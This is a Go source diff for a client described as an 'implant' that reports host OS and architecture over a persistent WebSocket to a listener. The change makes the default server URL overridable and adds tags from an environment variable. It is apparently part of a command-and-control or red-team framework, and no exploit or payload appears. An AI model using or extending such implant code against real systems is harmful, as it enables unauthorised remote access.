@@ -20,11 +20,13 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
+var defaultServerURL = "ws://127.0.0.1:8080/mux"
+var defaultTags = ""
+
 const (
-	defaultServerURL = "ws://127.0.0.1:8080/mux"
-	protoVersion     = 1
-	writeTimeout     = 10 * time.Second
-	pongTimeout      = 60 * time.Second
+	protoVersion = 1
+	writeTimeout = 10 * time.Second
+	pongTimeout  = 60 * time.Second
 )
 
 // Config controls how the implant connects and what metadata it reports.
@@ -42,6 +44,16 @@ func (c *Config) serverURL() string {
 		return u
 	}
 	return defaultServerURL
+}
+
+func (c *Config) tags() string {
+	if c.Tags != "" {
+		return c.Tags
+	}
+	if t := os.Getenv("RSL_TAGS"); t != "" {
+		return t
+	}
+	return defaultTags
 }
 
 // Client maintains one persistent WebSocket to the listener and multiplexes
@@ -91,7 +103,7 @@ func (c *Client) run(ctx context.Context) error {
 			Os:       runtime.GOOS,
 			Arch:     runtime.GOARCH,
 			Version:  protoVersion,
-			Tags:     c.cfg.Tags,
+			Tags:     c.cfg.tags(),
 		}},
 	}); err != nil {
 		return fmt.Errorf("send hello: %w", err)
